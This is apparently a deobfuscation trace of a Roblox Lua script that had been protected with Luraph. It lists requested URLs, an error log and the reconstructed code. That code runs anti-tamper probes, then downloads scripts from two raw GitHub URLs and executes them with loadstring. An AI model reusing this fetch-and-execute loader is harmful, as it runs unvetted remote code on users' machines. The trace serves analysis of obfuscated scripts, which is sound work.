-- Deobfuscated by deobf (dynamic trace)
-- source: input.lua
-- NOTE: reconstructed from observed behaviour; branches that were not taken
--       during the trace are missing and conditions are only noted in comments.
-- run status: script error: LPH:23: LPH:11: [string "Luraph"]:1: Chilli Library bootstrap is invalid.
--   C:/Users/User/Desktop/EGO/ravel0.7/Deobfuscator/newout/input.deobf.luau.harness.luau:5336
--   [string "Luraph"]:1 function fR
--   [string "Luraph"]:1
--   [string "Luraph"]:1
--   Script:3
--   C:/Users/User/Desktop/EGO/ravel0.7/Deobfuscator/newout/input.deobf.luau.harness.luau:5341
--   
-- 54 statements recorded in 1.77s
-- URLs requested:
--   https://raw.githubusercontent.com/tienkhanh1/spicy/refs/heads/main/DiscordLink
--   https://raw.githubusercontent.com/tienkhanh1/spicy/main/Chilli%20Library

-- [deobf] folded 8 repeated calls into 2 helper functions and 0 unrolled runs into loops
-- loadstring() of 164346 bytes: "return setmetatable({[88]=buffer.readi32,[43]=buffer.readbits,[97]=string.format,[12]=table.move,wk=function(G,y,W,w,_,k,p,l,h,P,m,Q)if P<=303 then if P<=302 then local o,D=h-128,(k-128)*16384;local s"
-- [deobf] removed 27 lines of the obfuscator's environment/anti-tamper probes
local function onAttributeChanged(value)
	local connection = value.AttributeChanged:Connect(function(attribute)
	end)

	connection:Disconnect()
end

onAttributeChanged(game)
onAttributeChanged(workspace)
local Folder = Instance.new("Folder")
onAttributeChanged(Folder)
Folder:GetChildren()
Folder:Destroy()
local Folder2 = Instance.new("Folder", Folder)
onAttributeChanged(Folder2)
Folder2.Name = "162917609"
Folder:WaitForChild("162917609")
Folder:Destroy()
Folder2:Destroy()
local HttpService = game:GetService("HttpService")
onAttributeChanged(HttpService)
local RunService = game:GetService("RunService")
onAttributeChanged(RunService)

local function helper()
	local response = game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/spicy/refs/heads/main/DiscordLink")
	loadstring(response)()
end

task.spawn(function()
	helper()
end, function()
	helper()
end)

local response3 = game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/spicy/main/Chilli%20Library")
loadstring(response3)()
